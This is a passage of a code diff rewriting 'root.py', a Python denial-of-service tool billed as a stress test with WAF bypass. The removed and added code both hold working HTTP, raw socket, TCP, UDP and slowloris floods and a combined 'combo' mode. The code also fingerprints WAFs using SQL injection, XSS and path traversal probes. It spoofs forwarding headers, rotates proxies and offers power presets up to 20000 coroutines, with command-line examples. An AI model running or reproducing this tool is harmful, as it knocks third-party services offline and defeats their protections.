+            print(f"[*] Using {len(proxy_list)} cached")
+        else:print("[!] No proxies")
+def get_proxy():
+    if not proxy_list:return None
+    with proxy_lock:return random.choice(proxy_list)
 
-# ══════════════════════════════════════════════════════════
-#  GLOBAL STATS (thread-safe)
-# ══════════════════════════════════════════════════════════
-stats = {"total": 0, "success": 0, "fail": 0}
-stop_event = threading.Event()
-detected_waf = None
-bypass_strategy = None
-
-# ══════════════════════════════════════════════════════════
-#  WAF SCAN
-# ══════════════════════════════════════════════════════════
-def run_waf_scan(url):
-    global detected_waf, bypass_strategy
-    print("\n"+"="*55+"\n  WAF DETECTION\n"+"="*55)
-    print(f"  Target: {url}\n  Probing ...\n")
-    result = scan_waf(url)
-    print(f"  Server : {result.get('server','?')}")
-    print(f"  Status : {result.get('status','?')}")
-    if result["detected"]:
-        print("\n  [!] WAF DETECTED:")
-        for name, score in result["detected"]:
-            print(f"      {name:<25} score:{score}")
-        detected_waf = result["detected"][0][0]
-        bypass_strategy = BypassStrategy(detected_waf)
-        print(f"\n  [*] Bypass loaded: {detected_waf}")
-    else:
-        print("  [+] No WAF detected")
-        bypass_strategy = BypassStrategy(None)
-    print("="*55)
-
-# ══════════════════════════════════════════════════════════
-#  ATTACK LAUNCHER
-# ══════════════════════════════════════════════════════════
-
-def launch_attack(url, method, thread_count, async_count):
-    """Launch the appropriate attack based on method."""
-    parsed = urlparse(url)
-    host = parsed.hostname
-    port = parsed.port or (443 if parsed.scheme == "https" else 80)
-    path = parsed.path or "/"
-    use_ssl = parsed.scheme == "https"
-
-    if method == "async":
-        # Pure async HTTP flood - maximum throughput
-        print(f"  [*] Launching {async_count} async coroutines ...")
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(run_async_flood(url, async_count, bypass_strategy, stats, stop_event, "GET"))
-        except KeyboardInterrupt:
-            pass
-        finally:
-            loop.close()
-
-    elif method == "async-mixed":
-        print(f"  [*] Launching {async_count} async mixed coroutines ...")
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(run_async_flood(url, async_count, bypass_strategy, stats, stop_event, "MIXED"))
-        except KeyboardInterrupt:
-            pass
-        finally:
-            loop.close()
-
-    elif method == "raw-get":
-        print(f"  [*] Launching {thread_count} raw socket GET threads ...")
-        for _ in range(thread_count):
-            t = threading.Thread(target=raw_http_worker, args=(host, port, path, use_ssl, stats, stop_event, "GET"), daemon=True)
-            t.start()
-
-    elif method == "raw-post":
-        print(f"  [*] Launching {thread_count} raw socket POST threads ...")
-        for _ in range(thread_count):
-            t = threading.Thread(target=raw_http_worker, args=(host, port, path, use_ssl, stats, stop_event, "POST"), daemon=True)
-            t.start()
-
-    elif method == "raw-mixed":
-        print(f"  [*] Launching {thread_count} raw socket mixed threads ...")
-        for _ in range(thread_count):
-            t = threading.Thread(target=raw_http_worker, args=(host, port, path, use_ssl, stats, stop_event, "MIXED"), daemon=True)
-            t.start()
-
-    elif method == "tcp":
-        print(f"  [*] Launching {thread_count} TCP flood threads ...")
-        for _ in range(thread_count):
-            t = threading.Thread(target=tcp_worker, args=(host, port, stats, stop_event), daemon=True)
-            t.start()
-
-    elif method == "udp":
-        print(f"  [*] Launching {thread_count} UDP flood threads ...")
-        for _ in range(thread_count):
-            t = threading.Thread(target=udp_worker, args=(host, port, stats, stop_event), daemon=True)
-            t.start()
-
-    elif method == "slowloris":
-        print(f"  [*] Launching {thread_count} slowloris threads ...")
-        for _ in range(thread_count):
-            t = threading.Thread(target=slowloris_worker, args=(host, port, stats, stop_event), daemon=True)
-            t.start()
-
-    elif method == "combo":
-        # Ultimate mode: async + raw socket + multiple methods
-        print(f"  [*] COMBO MODE: {async_count} async + {thread_count} raw threads ...")
-        # 40% raw GET threads
-        raw_get_count = int(thread_count * 0.4)
-        for _ in range(raw_get_count):
-            t = threading.Thread(target=raw_http_worker, args=(host, port, path, use_ssl, stats, stop_event, "GET"), daemon=True)
-            t.start()
-        # 30% raw POST threads
-        raw_post_count = int(thread_count * 0.3)
-        for _ in range(raw_post_count):
-            t = threading.Thread(target=raw_http_worker, args=(host, port, path, use_ssl, stats, stop_event, "POST"), daemon=True)
-            t.start()
-        # 20% TCP threads
-        tcp_count = int(thread_count * 0.2)
-        for _ in range(tcp_count):
-            t = threading.Thread(target=tcp_worker, args=(host, port, stats, stop_event), daemon=True)
-            t.start()
-        # 10% slowloris
-        sl_count = max(1, int(thread_count * 0.1))
-        for _ in range(sl_count):
-            t = threading.Thread(target=slowloris_worker, args=(host, port, stats, stop_event), daemon=True)
-            t.start()
-        # Async on top
-        async_thread = threading.Thread(target=_run_async_in_thread, args=(url, async_count), daemon=True)
-        async_thread.start()
-
-def _run_async_in_thread(url, count):
-    """Run async flood in a separate thread."""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+WAF_SIGS={"Cloudflare":(["cf-ray","cf-cache-status"],["__cfduid","cf_clearance","__cf_bm"],["cloudflare","ray ID"]),"AWS WAF":(["x-amzn-requestid"],["awsalb"],["Request blocked"]),"Akamai":(["x-akamai-transformed"],["ak_bmsc","bm_sv"],["Access Denied","Reference#"]),"Sucuri":(["x-sucuri-id"],["sucuri_cloudproxy"],["sucuri","cloudproxy"]),"Imperva":(["x-iinfo"],["incap_ses","visid_incap"],["incapsula","imperva"]),"ModSecurity":([],[],["modsecurity","mod_security"]),"F5 BIG-IP":(["x-wa-info"],["bigipserver"],["request rejected"]),"Wordfence":([],["wfvt_"],["wordfence"]),"DDoS-Guard":(["server"],["__ddg1"],["ddos-guard"]),"Cloudfront":(["x-amz-cf-id"],[],["cloudfront"])}
+def detect_waf(resp):
+    if resp is None:return[]
+    hd={k.lower():v.lower() for k,v in resp.headers.items()}
+    ck={k.lower():v for k,v in resp.cookies.items()}
+    bd=resp.text.lower()[:5000];cd=resp.status_code;det=[]
+    for name,(hs,cs,bs) in WAF_SIGS.items():
+        sc=0
+        for h in hs:
+            if h in hd:sc+=2
+        for c in cs:
+            for cn in ck:
+                if c in cn:sc+=3;break
+        for b in bs:
+            if b in bd:sc+=2
+        if cd in(403,503):sc+=1
+        if sc>=3:det.append((name,sc))
+    det.sort(key=lambda x:x[1],reverse=True)
+    return det
+def scan_waf(url):
+    res={"detected":[],"status":None,"server":None}
     try:
-        loop.run_until_complete(run_async_flood(url, count, bypass_strategy, stats, stop_event, "MIXED"))
-    except: pass
-    finally: loop.close()
+        r=requests.get(url,timeout=10,allow_redirects=True)
+        res["status"]=r.status_code;res["server"]=r.headers.get("Server","?")
+        for w,s in detect_waf(r):
+            if w not in[x[0] for x in res["detected"]]:res["detected"].append((w,s))
+    except:pass
+    for probe in["?id=1' OR '1'='1","?t=<script>alert(1)</script>","?c=../../../etc/passwd"]:
+        try:
+            r=requests.get(url+probe,timeout=8,allow_redirects=True)
+            for w,s in detect_waf(r):
+                if w not in[x[0] for x in res["detected"]]:res["detected"].append((w,s))
+        except:pass
+    return res
+def _rs(n=8):return''.join(random.choices(string.ascii_lowercase+string.digits,k=n))
+def _rip():return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/121.0.0.0"]
+REFS=["https://www.google.com/","https://www.bing.com/","https://www.yahoo.com/","https://duckduckgo.com/","https://www.facebook.com/",""]
+class BypassStrategy:
+    def __init__(s,waf=None):s.waf=waf
+    def headers(s):
+        h={"User-Agent":random.choice(UAS),"Accept":"text/html,*/*;q=0.8","Accept-Language":random.choice(["en-US,en;q=0.9","tr-TR,tr;q=0.9","de-DE,de;q=0.9"]),"Accept-Encoding":"gzip, deflate","Cache-Control":"no-cache","Referer":random.choice(REFS),"X-Forwarded-For":_rip(),"X-Real-IP":_rip()}
+        if s.waf=="Cloudflare":h["CF-Connecting-IP"]=_rip()
+        elif s.waf in("AWS WAF","Akamai"):h["X-Forwarded-For"]="127.0.0."+str(random.randint(1,254));h["X-Original-URL"]="/"
+        elif s.waf in("Imperva","Sucuri"):h["True-Client-IP"]=_rip()
+        return h
+    def mutate_url(s,url):
+        p=urlparse(url);path=p.path or "/"
+        m=random.choice([lambda x:x,lambda x:x+"?"+_rs(5)+"="+_rs(10),lambda x:x+"/"+_rs(4),lambda x:x+";jsessionid="+_rs(32)])
+        return f"{p.scheme}://{p.netloc}{m(path)}"
 
-# ══════════════════════════════════════════════════════════
-#  MONITOR
-# ══════════════════════════════════════════════════════════
-
-def monitor_thread():
-    """Real-time stats monitor."""
-    start = time.time()
-    prev = 0
+stats={"total":0,"success":0,"fail":0}
+stop_event=threading.Event()
+detected_waf=None
+bypass_strat=None
+def raw_http(host,port,path,use_ssl):
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(5)
+        if use_ssl:ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;s=ctx.wrap_socket(s,server_hostname=host)
+        s.connect((host,port))
+        qp="&".join(f"{_rs(4)}={_rs(8)}" for _ in range(random.randint(1,4)))
+        rq=f"GET {path}?{qp} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nAccept: */*\r\nX-Forwarded-For: {_rip()}\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n"
+        s.send(rq.encode());s.close();return True
+    except:
+        try:s.close()
+        except:pass
+        return False
+def raw_post(host,port,path,use_ssl):
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(5)
+        if use_ssl:ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;s=ctx.wrap_socket(s,server_hostname=host)
+        s.connect((host,port))
+        body="&".join(f"{_rs(6)}={_rs(random.randint(10,50))}" for _ in range(random.randint(3,8)))
+        rq=f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\nX-Forwarded-For: {_rip()}\r\nConnection: keep-alive\r\n\r\n{body}"
+        s.send(rq.encode());s.close();return True
+    except:
+        try:s.close()
+        except:pass
+        return False
+def tcp_flood(host,port):
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(4)
+        s.setsockopt(socket.SOL_SOCKET,socket.SO_LINGER,struct.pack('ii',1,0))
+        s.connect((host,port));s.send(random._urandom(random.randint(64,1024)));s.close();return True
+    except:
+        try:s.close()
+        except:pass
+        return False
+def udp_flood(host,port):
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        s.sendto(random._urandom(random.randint(64,65500)),(host,port));s.close();return True
+    except:
+        try:s.close()
+        except:pass
+        return False
+def slowloris_hold(host,port):
+    socks=[]
     while not stop_event.is_set():
-        time.sleep(1)
-        total = stats["total"]
-        if total > prev:
-            elapsed = time.time() - start
-            rps = total / elapsed if elapsed > 0 else 0
-            sr = (stats["success"]/total*100) if total else 0
-            waf_tag = detected_waf or "None"
-            print(f"  [+] {total:>8} sent | {rps:>7.0f}/s | OK:{sr:>4.0f}% | WAF:{waf_tag}")
-            prev = total
+        for _ in range(random.randint(5,20)):
+            try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(10);s.connect((host,port))
+                s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\nConnection: keep-alive\r\nKeep-Alive: {random.randint(300,1200)}\r\nContent-Length: {random.randint(100,10000)}\r\n".encode())
+                socks.append(s);stats["total"]+=1;stats["success"]+=1
+            except:stats["fail"]+=1
+        alive=[]
+        for s in socks:
+            try:s.send(f"X-a: {random.randint(1,5000)}\r\n".encode());alive.append(s)
+            except:
+                stats["fail"]+=1
+                try:s.close()
+                except:pass
+        socks=alive;time.sleep(random.uniform(5,15))
+    for s in socks:
+        try:s.close()
+        except:pass
+async def async_worker(session,url,bp,method="GET"):
+    try:
+        h=bp.headers() if bp else{"User-Agent":random.choice(UAS),"X-Forwarded-For":_rip()}
+        t=bp.mutate_url(url) if bp else url
+        sep="&" if "?" in t else "?"
+        t=f"{t}{sep}_={_rs(6)}"
+        if method=="POST":
+            async with session.post(t,headers=h,data={_rs(5):_rs(20) for _ in range(3)},timeout=aiohttp.ClientTimeout(total=8),ssl=False) as r:await r.read();return r.status<400
+        elif method=="HEAD":
+            async with session.head(t,headers=h,timeout=aiohttp.ClientTimeout(total=8),ssl=False) as r:return r.status<400
+        else:
+            async with session.get(t,headers=h,timeout=aiohttp.ClientTimeout(total=8),ssl=False) as r:await r.read();return r.status<400
+    except:return False
+async def async_loop(session,url,bp,method):
+    ms=["GET","POST","HEAD"] if method=="MIXED" else[method]
+    while not stop_event.is_set():
+        ok=await async_worker(session,url,bp,random.choice(ms))
+        stats["total"]+=1
+        if ok:stats["success"]+=1
+        else:stats["fail"]+=1
+async def run_async(url,count,bp,method="GET"):
+    conn=aiohttp.TCPConnector(limit=0,limit_per_host=0,ttl_dns_cache=300,force_close=False,keepalive_timeout=30)
+    async with aiohttp.ClientSession(connector=conn) as session:
+        tasks=[asyncio.ensure_future(async_loop(session,url,bp,method)) for _ in range(count)]
+        await asyncio.gather(*tasks,return_exceptions=True)
 
-# ══════════════════════════════════════════════════════════
-#  CLI
-# ══════════════════════════════════════════════════════════
-
-BANNER = r"""
+def raw_worker(host,port,path,use_ssl,method="GET"):
+    while not stop_event.is_set():
+        if method=="POST":ok=raw_post(host,port,path,use_ssl)
+        elif method=="MIXED":ok=raw_http(host,port,path,use_ssl) if random.random()<0.6 else raw_post(host,port,path,use_ssl)
+        else:ok=raw_http(host,port,path,use_ssl)
+        stats["total"]+=1
+        if ok:stats["success"]+=1
+        else:stats["fail"]+=1
+def tcp_worker(host,port):
+    while not stop_event.is_set():
+        ok=tcp_flood(host,port);stats["total"]+=1
+        if ok:stats["success"]+=1
+        else:stats["fail"]+=1
+def udp_worker(host,port):
+    while not stop_event.is_set():
+        ok=udp_flood(host,port);stats["total"]+=1
+        if ok:stats["success"]+=1
+        else:stats["fail"]+=1
+def monitor():
+    start=time.time();prev=0
+    while not stop_event.is_set():
+        time.sleep(1);total=stats["total"]
+        if total>prev:
+            el=time.time()-start;rps=total/el if el>0 else 0;sr=(stats["success"]/total*100) if total else 0
+            print(f"  [+] {total:>8} sent | {rps:>7.0f}/s | OK:{sr:>4.0f}% | WAF:{detected_waf or'None'}")
+            prev=total
+def run_waf_scan(url):
+    global detected_waf,bypass_strat
+    print("\n"+"="*55+"\n  WAF DETECTION\n"+"="*55+f"\n  Target: {url}\n  Probing ...\n")
+    r=scan_waf(url)
+    print(f"  Server: {r.get('server','?')}\n  Status: {r.get('status','?')}")
+    if r["detected"]:
+        print("\n  [!] WAF DETECTED:")
+        for n,s in r["detected"]:print(f"      {n:<25} score:{s}")
+        detected_waf=r["detected"][0][0];bypass_strat=BypassStrategy(detected_waf)
+        print(f"\n  [*] Bypass: {detected_waf}")
+    else:print("  [+] No WAF detected");bypass_strat=BypassStrategy(None)
+    print("="*55)
+def _async_thread(url,count,method):
+    loop=asyncio.new_event_loop();asyncio.set_event_loop(loop)
+    try:loop.run_until_complete(run_async(url,count,bypass_strat,method))
+    except:pass
+    finally:loop.close()
+def launch(url,method,tc,ac):
+    p=urlparse(url);host=p.hostname;port=p.port or(443 if p.scheme=="https" else 80);path=p.path or"/";use_ssl=p.scheme=="https"
+    if method in("async","async-mixed"):
+        m="MIXED" if method=="async-mixed" else "GET"
+        print(f"  [*] {ac} async coroutines ...");loop=asyncio.new_event_loop();asyncio.set_event_loop(loop)
+        try:loop.run_until_complete(run_async(url,ac,bypass_strat,m))
+        except KeyboardInterrupt:pass
+        finally:stop_event.set();loop.close()
+    elif method in("raw-get","raw-post","raw-mixed"):
+        m={"raw-get":"GET","raw-post":"POST","raw-mixed":"MIXED"}[method]
+        print(f"  [*] {tc} raw socket threads ...");[threading.Thread(target=raw_worker,args=(host,port,path,use_ssl,m),daemon=True).start() for _ in range(tc)]
+    elif method=="tcp":
+        print(f"  [*] {tc} TCP threads ...");[threading.Thread(target=tcp_worker,args=(host,port),daemon=True).start() for _ in range(tc)]
+    elif method=="udp":
+        print(f"  [*] {tc} UDP threads ...");[threading.Thread(target=udp_worker,args=(host,port),daemon=True).start() for _ in range(tc)]
+    elif method=="slowloris":
+        print(f"  [*] {tc} slowloris threads ...");[threading.Thread(target=slowloris_hold,args=(host,port),daemon=True).start() for _ in range(tc)]
+    elif method=="combo":
+        print(f"  [*] COMBO: {ac} async + {tc} threads ...")
+        g=int(tc*0.4);po=int(tc*0.3);tp=int(tc*0.2);sl=max(1,int(tc*0.1))
+        [threading.Thread(target=raw_worker,args=(host,port,path,use_ssl,"GET"),daemon=True).start() for _ in range(g)]
+        [threading.Thread(target=raw_worker,args=(host,port,path,use_ssl,"POST"),daemon=True).start() for _ in range(po)]
+        [threading.Thread(target=tcp_worker,args=(host,port),daemon=True).start() for _ in range(tp)]
+        [threading.Thread(target=slowloris_hold,args=(host,port),daemon=True).start() for _ in range(sl)]
+        threading.Thread(target=_async_thread,args=(url,ac,"MIXED"),daemon=True).start()
+BANNER=r"""
  ____   ___   ___ _____   ______   __   _  _    ___
 |  _ \ / _ \ / _ \_   _| |  _ \ \ / / | || |  / _ \
 | |_) | | | | | | || |   | |_) \ V /  | || |_| | | |
 |  _ <| |_| | |_| || |   |  __/ | |   |__   _| |_| |
 |_| \_\\___/ \___/ |_|   |_|    |_|      |_|(_)\___/
 """
-
-METHODS_INFO = {
-    "async":      "Async HTTP GET flood (aiohttp, max throughput)",
-    "async-mixed":"Async HTTP mixed GET/POST/HEAD flood",
-    "raw-get":    "Raw socket GET flood (no library overhead)",
-    "raw-post":   "Raw socket POST flood with random data",
-    "raw-mixed":  "Raw socket mixed GET/POST flood",
-    "tcp":        "TCP connection flood",
-    "udp":        "UDP packet flood",
-    "slowloris":  "Slowloris slow connection attack",
-    "combo":      "COMBO: async + raw socket + TCP + slowloris",
-}
-
-def build_parser():
-    methods_help = "\n".join(f"  {k:<14} {v}" for k,v in METHODS_INFO.items())
-    p = argparse.ArgumentParser(
-        prog="root.py",
-        description=f"Advanced HTTP Stress Test + WAF Bypass Tool v{__version__}",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=f"""
-attack methods:
-{methods_help}
-
-power levels (presets):
-  --power low        50 threads, 500 async
-  --power medium     200 threads, 2000 async
-  --power high       500 threads, 5000 async
-  --power extreme    1000 threads, 10000 async
-  --power max        2000 threads, 20000 async
-
-examples:
-  python3 root.py http://target.com -m async -a 5000
-  python3 root.py http://target.com -m combo --power high
-  python3 root.py http://target.com -m raw-get -t 500
-  python3 root.py http://target.com -m slowloris -t 300
-  python3 root.py http://target.com -m tcp -t 1000
-  python3 root.py http://target.com --waf-scan
-  python3 root.py --update-proxies
-
-tips:
-  - 'combo' is the most effective method (combines all vectors)
-  - 'async' is best for HTTP layer throughput
-  - 'raw-get/post' bypass requests library overhead
-  - 'tcp' is pure connection flood
-  - 'slowloris' holds connections open
-  - Use --power max on high-spec systems
-  - Press Ctrl+C to stop and see final stats
-        """)
-
-    p.add_argument("url", nargs="?", help="Target URL")
-    p.add_argument("-m","--method", choices=list(METHODS_INFO.keys()), default="async", help="Attack method (default:async)")
-    p.add_argument("-t","--threads", type=int, default=None, help="Thread count for raw/tcp/udp/slowloris")
-    p.add_argument("-a","--async-count", type=int, default=None, help="Async coroutine count")
-    p.add_argument("--power", choices=["low","medium","high","extreme","max"], default=None, help="Power preset")
-    p.add_argument("--no-proxy", action="store_true", help="Disable proxy")
-    p.add_argument("--proxy-file", type=str, help="Custom proxy file")
-    p.add_argument("--waf-scan", action="store_true", help="Only scan WAF")
-    p.add_argument("--skip-waf", action="store_true", help="Skip WAF detection")
-    p.add_argument("--update-proxies", action="store_true", help="Update proxies only")
-    p.add_argument("-v","--version", action="version", version=f"root.py v{__version__}")
-    return p
-
-POWER_PRESETS = {
-    "low":     {"threads": 50,   "async": 500},
-    "medium":  {"threads": 200,  "async": 2000},
-    "high":    {"threads": 500,  "async": 5000},
-    "extreme": {"threads": 1000, "async": 10000},
-    "max":     {"threads": 2000, "async": 20000},
-}
-
-# ══════════════════════════════════════════════════════════
-#  MAIN
-# ══════════════════════════════════════════════════════════
-
+MI={"async":"Async HTTP GET (max throughput)","async-mixed":"Async mixed GET/POST/HEAD","raw-get":"Raw socket GET","raw-post":"Raw socket POST","raw-mixed":"Raw socket mixed","tcp":"TCP flood","udp":"UDP flood","slowloris":"Slowloris","combo":"ALL combined"}
+PP={"low":{"t":50,"a":500},"medium":{"t":200,"a":2000},"high":{"t":500,"a":5000},"extreme":{"t":1000,"a":10000},"max":{"t":2000,"a":20000}}
 def main():
-    global detected_waf, bypass_strategy, proxy_list
-
-    parser = build_parser()
-    args = parser.parse_args()
-
-    print(BANNER)
-    print(f"  v{__version__} | Python {sys.version.split()[0]} | PID:{os.getpid()}")
-    print()
-
-    if args.update_proxies:
-        update_proxies(); sys.exit(0)
-
-    if not args.url:
-        parser.print_help(); sys.exit(1)
-
-    url = args.url
-    if not url.startswith("http"): url = "http://" + url
-    if url.count("/") == 2: url += "/"
-
-    # ── Power preset ──
-    if args.power:
-        preset = POWER_PRESETS[args.power]
-        tc = args.threads or preset["threads"]
-        ac = args.async_count or preset["async"]
-    else:
-        tc = args.threads or 200
-        ac = args.async_count or 2000
-
-    # ── Proxy ──
-    if args.no_proxy:
-        proxy_list = []
+    global detected_waf,bypass_strat,proxy_list
+    mh="\n".join(f"  {k:<14} {v}" for k,v in MI.items())
+    pa=argparse.ArgumentParser(prog="root.py",description=f"HTTP Stress Test + WAF Bypass v{__version__}",formatter_class=argparse.RawDescriptionHelpFormatter,epilog=f"methods:\n{mh}\n\npower: low|medium|high|extreme|max\n\nexamples:\n  python3 root.py http://target.com -m combo --power max\n  python3 root.py http://target.com -m async -a 5000\n  python3 root.py http://target.com --waf-scan\n  python3 root.py --update-proxies")
+    pa.add_argument("url",nargs="?");pa.add_argument("-m","--method",choices=list(MI.keys()),default="async")
+    pa.add_argument("-t","--threads",type=int);pa.add_argument("-a","--async-count",type=int)
+    pa.add_argument("--power",choices=list(PP.keys()));pa.add_argument("--no-proxy",action="store_true")
+    pa.add_argument("--proxy-file",type=str);pa.add_argument("--waf-scan",action="store_true")
+    pa.add_argument("--skip-waf",action="store_true");pa.add_argument("--update-proxies",action="store_true")
+    pa.add_argument("-v","--version",action="version",version=f"v{__version__}")
+    args=pa.parse_args()
+    print(BANNER);print(f"  v{__version__} | Python {sys.version.split()[0]}\n")
+    if args.update_proxies:update_proxies();sys.exit(0)
+    if not args.url:pa.print_help();sys.exit(1)
+    url=args.url
+    if not url.startswith("http"):url="http://"+url
+    if url.count("/")==2:url+="/"
+    if args.power:pr=PP[args.power];tc=args.threads or pr["t"];ac=args.async_count or pr["a"]
+    else:tc=args.threads or 200;ac=args.async_count or 2000
+    if args.no_proxy:proxy_list=[]
     elif args.proxy_file:
-        if os.path.exists(args.proxy_file):
-            with open(args.proxy_file) as f: proxy_list=[l.strip() for l in f if l.strip() and not l.startswith("#")]
-            print(f"[+] {len(proxy_list)} proxies from file")
-        else:
-            print(f"[!] Not found: {args.proxy_file}"); sys.exit(1)
+        with open(args.proxy_file) as f:proxy_list=[l.strip() for l in f if l.strip() and not l.startswith("#")]
+        print(f"[+] {len(proxy_list)} proxies")
+    else:update_proxies()
+    if not args.skip_waf:run_waf_scan(url)
+    else:bypass_strat=BypassStrategy(None)
+    if args.waf_scan:sys.exit(0)
+    ia=args.method.startswith("async")
+    print("\n"+"="*55+"\n  ATTACK STARTED\n"+"="*55)
+    print(f"  Target : {url}\n  Method : {args.method}\n  Threads: {tc}\n  Async  : {ac}\n  Proxies: {len(proxy_list)}\n  WAF    : {detected_waf or'None'}\n  Stop   : Ctrl+C\n"+"="*55+"\n")
+    threading.Thread(target=monitor,daemon=True).start()
+    if ia:launch(url,args.method,tc,ac)
     else:
-        update_proxies()
-
-    # ── WAF ──
-    if not args.skip_waf:
-        run_waf_scan(url)
-        if args.waf_scan: sys.exit(0)
-    else:
-        bypass_strategy = BypassStrategy(None)
-
-    # ── Launch ──
-    method = args.method
-    is_async = method.startswith("async")
-
-    print("\n" + "="*55)
-    print("  ATTACK STARTED")
-    print("="*55)
-    print(f"  Target   : {url}")
-    print(f"  Method   : {method} ({METHODS_INFO[method]})")
-    if not is_async:
-        print(f"  Threads  : {tc}")
-    if is_async or method == "combo":
-        print(f"  Async    : {ac} coroutines")
-    print(f"  Proxies  : {len(proxy_list)}")
-    print(f"  WAF      : {detected_waf or 'None'}")
-    print(f"  Bypass   : {'Active - '+detected_waf if detected_waf else 'Generic'}")
-    print(f"  Stop     : Ctrl+C")
-    print("="*55 + "\n")
-
-    # Start monitor
-    mon = threading.Thread(target=monitor_thread, daemon=True)
-    mon.start()
-
-    # Launch attack
-    if is_async:
-        # Async runs in main thread
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        launch(url,args.method,tc,ac)
         try:
-            m = "MIXED" if method == "async-mixed" else "GET"
-            loop.run_until_complete(run_async_flood(url, ac, bypass_strategy, stats, stop_event, m))
-        except KeyboardInterrupt:
-            pass
-        finally:
-            stop_event.set()
-            loop.close()
-    else:
-        launch_attack(url, method, tc, ac)
-        try:
-            while not stop_event.is_set():
-                time.sleep(1)
-        except KeyboardInterrupt:
-            stop_event.set()
-
-    # Final stats
-    time.sleep(0.5)
-    total = stats["total"]
-    sr = (stats["success"]/total*100) if total else 0
-    print(f"\n{'='*55}")
-    print(f"  FINAL RESULTS")
-    print(f"{'='*55}")
-    print(f"  Total    : {total:,}")
-    print(f"  Success  : {stats['success']:,} ({sr:.1f}%)")
-    print(f"  Failed   : {stats['fail']:,}")
-    print(f"  Method   : {method}")
-    print(f"  WAF      : {detected_waf or 'None'}")
-    print(f"{'='*55}")
-
-
-if __name__ == "__main__":
-    main()
+            while not stop_event.is_set():time.sleep(1)
+        except KeyboardInterrupt:stop_event.set()
+    time.sleep(0.5);total=stats["total"];sr=(stats["success"]/total*100) if total else 0
+    print(f"\n{'='*55}\n  RESULTS\n{'='*55}\n  Total  : {total:,}\n  OK     : {stats['success']:,} ({sr:.1f}%)\n  Fail   : {stats['fail']:,}\n{'='*55}")
+if __name__=="__main__":main()
